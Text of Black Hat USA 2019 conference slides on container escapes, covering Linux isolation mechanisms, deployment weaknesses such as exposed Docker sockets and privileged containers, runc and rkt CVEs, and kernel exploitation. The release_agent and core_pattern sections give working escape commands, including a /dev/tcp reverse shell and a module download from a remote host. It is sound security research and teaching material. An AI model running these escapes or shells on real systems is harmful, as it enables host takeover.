A Compendium
of Container Escapes
Brandon Edwards & Nick Freeman BLACK HAT USA 2019

Scope

Prologue: Container Basics Part I: Escape via Weakness in Deployment Part II: Vulnerabilities in Container Engines
Part III: Kernel Exploitation

Prologue: Container Basics

Container Basics
Container != VM

Container Basics

Container
PID 1
PID 2
PID 3

A task, or set of tasks, with special properties to isolate the task(s), and restrict access to system resources.

task_struct
volatile long state void *stack
...lots of fields...
int pid int tgid task_struct *parent cred *cred fs_struct *fs char comm[TASK_COMM_LEN] nsproxy *nsproxy css_set *cgroups
...many more fields...

The kernel refers to processes (and threads) as tasks
The kernel manages tasks using the task_struct
Everything the kernel knows about a task is inside or reachable via the task_struct

/proc is a special filesystem mount (procfs) for accessing system and process information directly from the kernel by reading "file" entries
user@host:~$ cat /proc/1/comm systemd

task_struct
volatile long state void *stack
...lots of fields...
int pid 1 int tgid 1
task_struct *parent cred *cred fs_struct *fs
char comm "systemd"
nsproxy *nsproxy css_set *cgroups
...many more fields...

/proc is a special filesystem mount (procfs) for accessing system and process information directly from the kernel by reading "file" entries
user@host:~$ cat /proc/1/comm systemd
PID of process

task_struct
volatile long state void *stack
...lots of fields...
int pid 1 int tgid 1
task_struct *parent cred *cred fs_struct *fs
char comm "systemd"
nsproxy *nsproxy css_set *cgroups
...many more fields...

/proc is a special filesystem mount (procfs) for accessing system and process information directly from the kernel by reading "file" entries
user@host:~$ cat /proc/1/comm systemd
PID of process Information being queried

task_struct
volatile long state void *stack
...lots of fields...
int pid 1 int tgid 1
task_struct *parent cred *cred fs_struct *fs
char comm "systemd"
nsproxy *nsproxy css_set *cgroups
...many more fields...

/proc is a special filesystem mount (procfs) for accessing system and process information directly from the kernel by reading "file" entries
user@host:~$ cat /proc/1/comm systemd
Result from kernel

task_struct
volatile long state void *stack
...lots of fields...
int pid 1 int tgid 1
task_struct *parent cred *cred fs_struct *fs
char comm "systemd"
nsproxy *nsproxy css_set *cgroups
...many more fields...

Container Basics

Container
PID 1
PID 2
PID 3

A task, or set of tasks, with special properties to isolate the task(s), and restrict access to system resources.

Container Basics
Container properties - Credentials - Capabilities - Filesystem - Namespaces - Cgroups - LSMs - seccomp

Credentials

Credentials describe the user identity of a task, which determine its permissions for shared resources such as files, semaphores, and shared memory.

See man page credentials(7)

The Linux Programming Interface, Kerrisk No Starch Press 2010

Credentials

Seal of Lilith, Sun of Great Knowledge, 1225

The Linux Programming Interface, Kerrisk No Starch Press 2010

Credentials

Seal of Lilith, Sun of Great Knowledge, 1225

The Linux Programming Interface, Kerrisk No Starch Press 2010

Traditional UNIX implementations of permissions distinguish two categories: privileged processes with user ID of 0 (root), and every other process.

Capabilities
Since kernel 2.2, Linux divides the privileges associated with superuser into distinct units known as capabilities.

CAP_KILL CAP_CHOWN CAP_MKNOD CAP_SETUID CAP_SETGID CAP_SYSLOG CAP_FOWNER CAP_FSETID

Capabilities

CAP_SYS_BOOT CAP_SYS_TIME CAP_SYS_PACCT CAP_SYS_RAWIO CAP_SYS_ADMIN CAP_SYS_CHROOT CAP_SYS_MODULE CAP_SYS_PTRACE

CAP_SYS_RESOURCE CAP_DAC_OVERRIDE CAP_MAC_ADMIN CAP_MAC_OVERRIDE CAP_NET_ADMIN CAP_NET_BIND_SERVICE CAP_NET_BROADCAST CAP_NET_RAW

These provide vastly more granular control over the task's permissions for privileged operations

CAP_KILL CAP_CHOWN CAP_MKNOD CAP_SETUID CAP_SETGID CAP_SYSLOG CAP_FOWNER CAP_FSETID

Capabilities

CAP_SYS_BOOT CAP_SYS_TIME CAP_SYS_PACCT CAP_SYS_RAWIO CAP_SYS_ADMIN CAP_SYS_CHROOT CAP_SYS_MODULE CAP_SYS_PTRACE

CAP_SYS_RESOURCE CAP_DAC_OVERRIDE CAP_MAC_ADMIN CAP_MAC_OVERRIDE CAP_NET_ADMIN CAP_NET_BIND_SERVICE CAP_NET_BROADCAST CAP_NET_RAW

Containers are tasks which run should run with a restricted set of capabilities; there are consistency issues across runtimes/versions

Filesystem Root
The filesystem root for a container is (usually) isolated from other containers and host's root filesystem via the pivot_root() syscall

Filesystem Root
The container's root mount is often planted in a container-specialized filesystem, such as AUFS or OverlayFS
/var/lib/docker/overlay2/..hash../diff

Filesystem Root
user@host:~$ docker run -it --name showfs ubuntu /bin/bash root@df65b429b317:/# root@df65b429b317:/# echo "hello" > /file.txt
user@host:~$ docker inspect showfs | grep UpperDir "UpperDir":"/var/lib/docker/overlay2/4119168db2bbaeec3db0919 b312983b2b49f93790453c532eeeea94c42e336b9/diff", user@host:~$ cat /var/lib/docker/overlay2/4119168db2bbaeec3d b0919b312983b2b49f93790453c532eeeea94c42e336b9/diff/file.txt hello
TL;DR is that the container's root of "/" really lives in /var/lib/docker/overlay2

Filesystem Root TL;DR is that the container's root of "/" really lives in /var/lib/docker/overlay2
This detail becomes important later on

Namespaces
setns() unshare()

Namespaces (PID)

Container Namespace
PID 1
PID 2 PID 3

Host Namespace
PID 16822
PID 16823
PID 16824

Namespaces (user)

Container UID(0) root

Host UID 1048579

UID(33)www-data

UID 1048612

User namespaces isolate security-related identifiers and attributes like credentials and capabilities.

Namespaces
PID namespaces have their own view of tasks User namespaces wrap mapping of UID to user Mount namespaces isolate mount points Net namespaces isolate the networking env UTS namespaces isolate their hostname IPC namespaces restrict SysV IPC objects Cgroup namespaces isolate the view of cgroups

CGroups
CPU time fork() depth block devices CGroups organize processes into hierarchical groups whose usage of various types of system resources can be limited and monitored.

CGroups
cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup cgroup on /sys/fs/cgroup/devices type cgroup cgroup on /sys/fs/cgroup/pids type cgroup cgroup on /sys/fs/cgroup/memory cgroup on /sys/fs/cgroup/rdma cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup cgroup on /sys/fs/cgroup/cpuset
CGroups are implemented as special file system mounts, where hierarchy is expressed through the directory tree in each mount.

CGroups
cgroup.procs

Linux Security Modules
AppArmor and SELinux are Linux security modules providing Mandatory Access Control (MAC), where access rules for a program are described by a profile

Linux Security Modules
Docker and LXC enable a default LSM profile in enforcement mode, which mostly serves to restrict a container's access to sensitive /proc and /sys entries.
The profile also denies mount syscall.

seccomp
Since kernel 3.17, Linux has a mechanism for filtering access to system calls through the seccomp subsystem

seccomp

kexec_file_load kexec_load membarrier migrate_pages move_pages nice pivot_root sigaction

sigpending sigprocmask sigsuspend _sysctl sysfs uselib userfault_fd vm86

Blocked (SCMP_ACT_ERRNO)

bpf clone fanotify_init mount perf_event_open setns umount unshare
Requires CAP_SYS_ADMIN

Docker's default seccomp policy at a glance

seccomp

kexec_file_load kexec_load membarrier migrate_pages move_pages nice pivot_root sigaction

sigpending sigprocmask sigsuspend _sysctl sysfs uselib userfault_fd vm86

Blocked (SCMP_ACT_ERRNO)

bpf clone fanotify_init mount perf_event_open setns umount unshare
Requires CAP_SYS_ADMIN

For a better example of reduced attack surface, checkout @jessfraz http://contained.af

seccomp

kexec_file_load kexec_load membarrier migrate_pages move_pages nice pivot_root sigaction

sigpending sigprocmask sigsuspend _sysctl sysfs uselib userfault_fd vm86

Blocked (SCMP_ACT_ERRNO)

bpf clone fanotify_init mount perf_event_open setns umount unshare
Requires CAP_SYS_ADMIN

Container Security Model

What you think you can do Capabilities

What you can actually do LSM

Credentials

seccomp

Where you can do it UUsseerrNNSS ccggrroouuppss nsproxy

Part I: Escape via Weakness in Deployment

Bad idea #1: Exposed Docker Socket
The docker socket is what you talk to whenever you run a Docker command. You can also access it with curl:
$ curl --unix-socket $SOCKETPATH -d '{"Image":"evil", "Privileged":"true"}' -H 'Content-Type: application/json' 0/containers/create {"Id":"22093d29e3c35e52d1d1dd0e3540e0792d4b5e6dc1847e69a0e5bdcd2d3d9982","W arnings":null}
$ curl -XPOST --unix-socket $SOCKETPATH 0/containers/22093..9982/start $ # :)

Bad idea #2: --privileged container
Running a Docker container with --privileged removes most of the isolation provided by containers.
$ curl -O exploit.delivery/bad.ko && insmod bad.ko

Bad idea #2: --privileged container
Privileged containers can also register usermode program helpers

Segue: Usermode Helper Programs call_usermodehelper_exec()

Usermode Helper Programs Container
Kernel
helper_program= ""

Usermode Helper Programs Container
1. get overlay path from /etc/mtab "upperdir"
Kernel
helper_program= ""

Usermode Helper Programs
Container
1. get overlay path from /etc/mtab "upperdir"
/var/lib/docker/overlay2/..hash../diff
Kernel
helper_program= ""

Usermode Helper Programs
Container
1. get overlay path from /etc/mtab "upperdir" 2. set payloadPath=$overlay/payload
Kernel
helper_program= ""

Usermode Helper Programs
Container
1. get overlay path from /etc/mtab "upperdir" 2. set payloadPath=$overlay/payload
/var/lib/docker/overlay2/..hash../diff/payload
Kernel
helper_program= ""

Usermode Helper Programs
Container
1. get overlay path from /etc/mtab "upperdir" 2. set payloadPath=$overlay/payload 3. mount /special/fs
Kernel
helper_program= ""

Usermode Helper Programs
Container
1. get overlay path from /etc/mtab "upperdir" 2. set payloadPath=$overlay/payload 3. mount /special/fs 4.echo $payloadPath > /special/fs/callback
Kernel
helper_program= ""

Usermode Helper Programs
Container
1. get overlay path from /etc/mtab "upperdir" 2. set payloadPath=$overlay/payload 3. mount /special/fs 4.echo $payloadPath > /special/fs/callback
Kernel
helper_program= "/var/lib/docker/overlay2/..hash../diff/payload"

Usermode Helper Programs
Container
1. get overlay path from /etc/mtab "upperdir" 2. set payloadPath=$overlay/payload 3. mount /special/fs 4.echo $payloadPath > /special/fs/callback 5. trigger or wait for event
Kernel
helper_program= "/var/lib/docker/overlay2/..hash../diff/payload"

Usermode Helper Programs
Container
1. get overlay path from /etc/mtab "upperdir" 2. set payloadPath=$overlay/payload 3. mount /special/fs 4.echo $payloadPath > /special/fs/callback
5. trigg[ekr otrhwraiet faordedve]nt
Kernel exec /var/lib/docker/overlay2/..hash../diff/payload
helper_program= "/var/lib/docker/overlay2/..hash../diff/payload"

Usermode Helper Programs
Container
1. get overlay path from /etc/mtab "upperdir" 2. set payloadPath=$overlay/payload 3. mount /special/fs 4.echo $payloadPath > /special/fs/callback
5. trigg[ekr otrhwraiet faordedve]nt
Kernel exec /var/lib/docker/overlay2/..hash../diff/payload
helper_program= "/var/lib/docker/overlay2/..hash../diff/payload"

@_fel1x release_agent Escape
1. Finds + enables a cgroup release_agent 2. Enables notify_on_release in the cgroup 3. Finds path of OverlayFS mount for container 4. Sets release_agent to /path/payload 5. Payload redirects output to file in /path 6. Triggers the cgroup via empty cgroup.procs

OverlayFS
overlay=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
Thanks @_fel1x

Payload Example
root@85c050f5:/# cat /shell.sh #!/bin/bash /bin/bash -c "/bin/bash -i >& /dev/tcp/172.17.0.2/9001 0>&1"

release_agent escape
root@85c050f5:/# mkdir /tmp/esc root@85c050f5:/# mount -t cgroup -o rdma cgroup /tmp/esc root@85c050f5:/# mkdir /tmp/esc/w root@85c050f5:/# echo 1 > /tmp/esc/w/notify_on_release root@85c050f5:/# pop="$overlay/shell.sh" root@85c050f5:/# echo $pop > /tmp/esc/release_agent root@85c050f5:/# sleep 5 && echo 0>/tmp/esc/w/cgroup.procs & root@85c050f5:/# nc -l -p 9001 bash: cannot set terminal process group (-1): Inappropriate ioctl for device bash: no job control in this shell root@ubuntu:/#

Usermode Helper Programs
- release_agent - core_pattern - binfmt_misc - uevent_helper - modprobe

Usermode Helper Programs
- release_agent - core_pattern - binfmt_misc - uevent_helper - modprobe

Bad idea #3: Excessive Capabilities

CAP_SYS_MODULE CAP_SYS_RAWIO CAP_SYS_ADMIN

// load a kernel module // access /proc/kcore, map NULL // "true root" - mount, debugfs, more

... --privileged allows all of the above.

Bad idea #4: Sensitive mounts
Access to the underlying host's /proc mount is a bad idea
docker run -v /proc:/host/proc

Bad idea #4: Sensitive mounts
Access to the underlying host's /proc mount is a bad idea
/host/proc/ is not protected by AppArmor

Bad idea #4: Sensitive mounts
Access to the underlying host's /proc mount is a bad idea
/host/proc/sys/kernel/core_pattern

Bad idea #4: Sensitive mounts
Access to the underlying host's /proc mount is a bad idea
/host/proc/sys/kernel/core_pattern

core_pattern escape
root@85c050f5:/# cd /proc/sys/kernel root@85c050f5:/# echo "|$overlay/shell.sh" > core_pattern root@85c050f5:/# sleep 5 && ./crash & root@85c050f5:/# nc -l -p 9001 bash: cannot set terminal process group (-1): Inappropriate ioctl for device bash: no job control in this shell root@ubuntu:/#

Part II: Vulnerabilities in Container Engines

Docker Vulnerabilities

Docker Vulnerabilities

CVE-2015-3630 CVE-2015-3631

CVE-2015-3627 CVE-2016-9662 CVE-2019-15664

Weak /proc permissions

Host FD leakage

CVE-2015-3627 CVE-2015-3629 CVE-2019-15664
Symlinks

Docker Vulnerabilities

CVE-2015-3630 CVE-2015-3631

CVE-2015-3627 CVE-2016-9662 CVE-2019-15664

Weak /proc permissions

Host FD leakage

CVE-2015-3627 CVE-2015-3629 CVE-2019-15664
Symlinks

Docker Vulnerabilities

CVE-2015-3630 CVE-2015-3631

CVE-2015-3627 CVE-2016-9662 CVE-2019-15664

Weak /proc permissions

Host FD leakage

CVE-2015-3627 CVE-2015-3629 CVE-2019-15664
Symlinks

RunC Vulnerability (CVE-2019-5736)

RunC Vulnerability (CVE-2019-5736)

Regular Container Startup

containerd > containerd-shim > runc

Drop privileges, capabilities, apply seccomp, make/apply namespaces

CONTAINER

PID 1

exec(ENTRYPOINT)

/proc/self/exe

Here, ENTRYPOINT is java -jar ...., with java being in that container

Regular Container Startup - Complete

containerd > containerd-shim > runc

Drop privileges, capabilities, apply seccomp, make/apply namespaces

CONTAINER

PID 1 java -jar ....

exec(ENTRYPOINT)

/proc/self/exe

After exec, ps would output containerd > containerd-shim > java

The RunC Escape (CVE-2019-5736)

containerd > containerd-shim > runc

Drop privileges, capabilities, apply seccomp, make/apply namespaces

CONTAINER

PID 1
runc

exec(ENTRYPOINT)

/proc/self/exe

But if ENTRYPOINT is /proc/self/exe, it runs runc from the host

The RunC Escape (CVE-2019-5736)

containerd > containerd-shim > runc

I'm taking the FD to runc, kthx

CONTAINER

PID 1
runc
libapparmor1
FD

Drop privileges, capabilities, apply seccomp, make/apply namespaces

exec(ENTRYPOINT)

/proc/self/exe

An evil process/library in the container can get a reference to runc on the host

CVE-2019-5736 Detail

CONTAINER

PID 1
runc

exec(ENTRYPOINT)

libapparmor1

FD

exec(/evil)

PID 2
/evil
FD

/proc/self/exe

Library execs another program, which writes to the host FD. From now on:
containerd > containerd-shim > runc

rkt Vulnerabilities

rkt - CVE-2019-10144/10145/10457

CONTAINER

rkt enter

Drop privileges, capabilities, apply seccomp, make/apply namespaces

PID 1

exec(ENTRYPOINT)

/proc/self/exe

rkt - CVE-2019-10144/10145/10457

rkt enter

Drop privileges, capabilities, apply seccomp, make/apply namespaces

CONTAINER

PID 1

exec(ENTRYPOINT)

/proc/self/exe

rkt - CVE-2019-10144/10145/10457
rkt enter - like docker exec, but without key isolation measures
 No seccomp filtering (just like Kubernetes!)  No cgroup isolation  No capability restriction
More or less the same as a --privileged docker container

Part III: Kernel Exploitation

Kernel Exploitation
The security model of containers is predicated on kernel integrity

Dirty CoW (CVE-2016-5195)

PID 31337

file mapping

write memory

Dirty CoW (CVE-2016-5195)

PID 31337

file mapping

write memory
Copy-on-Write mapping

Dirty CoW (CVE-2016-5195)

PID 31337

file mapping

write memory
Copy-on-Write mapping

Dirty CoW (CVE-2016-5195)

PID 31337

file mapping

write memory

vDSO

<__vdso_time>:
<+0>: push <+1>: test <+4>: mov <+11>: mov <+14>: je <+16>: mov <+19>: pop <+20>: ret

rbp rdi,rdi rax,QWORD PTR [rip+0xffffffffffffc18d] rbp,rsp <time+19> QWORD PTR [rdi],rax rbp

The virtual dynamic shared object is a special mapping shared from the kernel with userland

Container
PID 1337

vDSO

Hosty McHostTas
k PID 55551

vDSO

Container
PID 1337

vDSO

Hosty McHostTas
k PID 55551

vDSO

Container
PID 1337

vDSO

Hosty McHostTas
k PID 55551

vDSO

Container
PID 1337

vDSO

Hosty McHostTas
k PID 55551

vDSO

Container
PID 1337

vDSO

Hosty McHostTas
k PID 55551

vDSO
BONUS FEATURES

Container
PID 1337

vDSO

Hosty McHostTas
k PID 55551

vDSO
BONUS FEATURES

Container
PID 1337

vDSO
Hosty McHostTas What k PID 55551
time() is it?
vDSO

Container
PID 1337

vDSO

IT'S PARTY TIME

vDSO

Hosty
McHostTas
What k PID 55551
time()
is it?

Kernel Exploitation
Let's talk about some common goals and patterns

task_struct
volatile long state void *stack
...lots of fields...
int pid int tgid task_struct *parent cred *cred fs_struct *fs char comm[TASK_COMM_LEN] nsproxy *nsproxy css_set *cgroups
...many more fields...

cred
...lots of fields...
kuid_t uid kuid_t gid kuid_t euid kuid_t egid
...lots of fields...
kernel_cap_t cap_inheritable kernel_cap_t cap_effective
...some more fields...
void *security user_namespace *user_ns
...many more fields...

Kernel Userspace

These two are up to something

Kernel Userspace

Kernel Userspace

Kernel

Step 1: Memory layout, state grooming, etc.

Userspace

Step 2: Trigger Bug

Kernel Userspace

Step 3: ROP to disable SMEP/SMAP

Kernel Userspace

Step 4: Return to userland

Kernel Userspace

Kernel

Step 5: commit_creds(\ prepare_creds(0));

Userspace

task_struct
volatile long state void *stack
...lots of fields...
int pid int tgid task_struct *parent cred *cred fs_struct *fs char comm[TASK_COMM_LEN] nsproxy *nsproxy css_set *cgroups
...many more fields...

cred
...lots of fields...
kuid_t uid kuid_t gid kuid_t euid kuid_t egid
...lots of fields...
kernel_cap_t cap_inheritable kernel_cap_t cap_effective
...some more fields...
void *security user_namespace *user_ns
...many more fields...

task_struct
volatile long state void *stack
...lots of fields...
int pid int tgid task_struct *parent cred *cred fs_struct *fs char comm[TASK_COMM_LEN] nsproxy *nsproxy css_set *cgroups
...many more fields...

cred
...lots of fields...
kuid_t uid kuid_t gid kuid_t euid kuid_t egid
...lots of fields...
kernel_cap_t cap_inheritable kernel_cap_t cap_effective
...some more fields...
void *security user_namespace *user_ns
...many more fields...

Revised Container Security Model

What you think you can do Capabilities

What you can actually do LSM

Credentials

seccomp

Where you can do it UUsseerrNNSS ccggrroouuppss nsproxy

Textbook commit_creds()payload
Assuming a new user namespace hasn't been set, this opens up escapes similar to --privileged
Escape becomes trivial via usermode helpers ;)

core_pattern escape
user@85c050f5:/$ ./privesc root@85c050f5:/# mkdir /newproc root@85c050f5:/# mount -t proc proc /newproc root@85c050f5:/# cd /newproc/sys/kernel root@85c050f5:/# echo "|$overlay/shell.sh" > core_pattern root@85c050f5:/# sleep 5 && ./crash & root@85c050f5:/# nc -l -p 9001 bash: cannot set terminal process group (-1): Inappropriate ioctl for device bash: no job control in this shell root@ubuntu:/#

core_pattern escape
user@85c050f5:/$ ./privesc root@85c050f5:/# mkdir /newproc root@85c050f5:/# mount -t proc proc /newproc root@85c050f5:/# cd /newproc/sys/kernel root@85c050f5:/# echo "|$overlay/shell.sh" > core_pattern root@85c050f5:/# sleep 5 && ./crash & root@85c050f5:/# nc -l -p 9001 bash: cannot set terminal process group (-1): Inappropriate ioctl for device bash: no job control in this shell root@ubuntu:/#

Kernel Exploitation
But what if they do employ user namespaces?

Getting true init

task = (char *)get_task(); while (pid != 1) {
task = *(char **)(task + PARENT_OFFSET); pid = *(uint32_t *)(task + PID_OFFSET); }

PID 1

Container

Getting true init

task = (char *)get_task(); while (pid != 1) {
task = *(char **)(task + PARENT_OFFSET); pid = *(uint32_t *)(task + PID_OFFSET); }

PID 1

Container

Getting true init

task = (char *)get_task(); while (pid != 1) {
task = *(char **)(task + PARENT_OFFSET); pid = *(uint32_t *)(task + PID_OFFSET); }

PID 1

Container

task_struct
volatile long state void *stack
...lots of fields...
int pid int tgid task_struct *parent cred *cred fs_struct *fs char comm[TASK_COMM_LEN] nsproxy *nsproxy css_set *cgroups
...many more fields...

nsproxy
atomic_t count uts_namespace *uts_ns ipc_namespace *ipc_ns mnt_namespace *mnt_ns pid_namespace *pid_ns_for_children net *net_ns cgroup_namespace *cgroup_ns

Escaping with namespaces
// copy INIT_NSPROXY to the in-container "init" ((_switch_task_ns)(SWITCH_TASK_NS))((void *)cntnr_init,
(void *)INIT_NSPROXY);

PID "1"

Container

Escaping with namespaces
// copy INIT_NSPROXY to the in-container "init" ((_switch_task_ns)(SWITCH_TASK_NS))((void *)cntnr_init,
(void *)INIT_NSPROXY);

PID "1"

Container

Escaping with namespaces
// copy INIT_NSPROXY to the in-container "init" ((_switch_task_ns)(SWITCH_TASK_NS))((void *)cntnr_init,
(void *)INIT_NSPROXY);
// grab in-container init's mnt NS fd int fd = ((_do_sys_open)(DO_SYS_OPEN))(AT_FDCWD,
"/proc/1/ns/mnt", O_RDONLY, 0);

PID "1"

Container

Escaping with namespaces
// copy INIT_NSPROXY to the in-container "init" ((_switch_task_ns)(SWITCH_TASK_NS))((void *)cntnr_init,
(void *)INIT_NSPROXY);

// grab in-container init's mnt NS fd int fd = ((_do_sys_open)(DO_SYS_OPEN))(AT_FDCWD,
"/proc/1/ns/mnt", O_RDONLY, 0);

PID "1"

// call setns() on it, giving our a better mount ((_sys_setns)(SYS_SETNS))(fd, 0);

Container

OR...

task_struct
volatile long state void *stack
...lots of fields...
int pid int tgid task_struct *parent cred *cred fs_struct *fs char comm[TASK_COMM_LEN] nsproxy *nsproxy css_set *cgroups
...many more fields...

fs_struct
int users spinlock_t lock seqcount_t seq int umask int in_exec struct path root struct path pwd

Swapping out fs_struct
// just copy init's fs_struct *(uint64_t *)(task + TASK_FS_OFFSET) = ((_copy_fs_struct)(COPY_FS_STRUCT))(
*(uint64_t *)(init + TASK_FS_OFFSET));
user@85c050f5:/tmp$ ./escape
// now that we have the root fs, we have free reign root@85c050f5:/tmp# docker run -it --privileged --pid host -v /:/hostroot ubuntu root@b33dac42:/# chroot /hostroot # :)

Takeaways

Lack of uniformity in container ecosystem complicates meaningful security metrics

Namespaces are hard (ref: CVE-2018-18955)

CVE-2019-5736 was awesome, but any decent kernel bug is a portal gun .

References
Spender was escaping before containers were containers, checkout the work: https://www.grsecurity.net/~spender/exploits/
Abusing Privileged and Unprivileged Linux Containers, by Jesse Hertz, NCC Group https://www.nccgroup.trust/globalassets/ourresearch/us/whitepapers/2016/june/container_whitepaper.pdf
Docker Escape Technology, Shengping Wang, Qihoo 360 Marvel Team https://cansecwest.com/slides/2016/CSW2016_Wang_DockerEscapeTechnology.pdf
An Exercise in Practical Container Escapology, Nick Freeman, Capsule8 https://capsule8.com/blog/practical-container-escape-exercise/

Thank you

Brandon Edwards @drraid
brandon@capsule8.com

Nick Freeman @0x7674
nick@capsule8.com

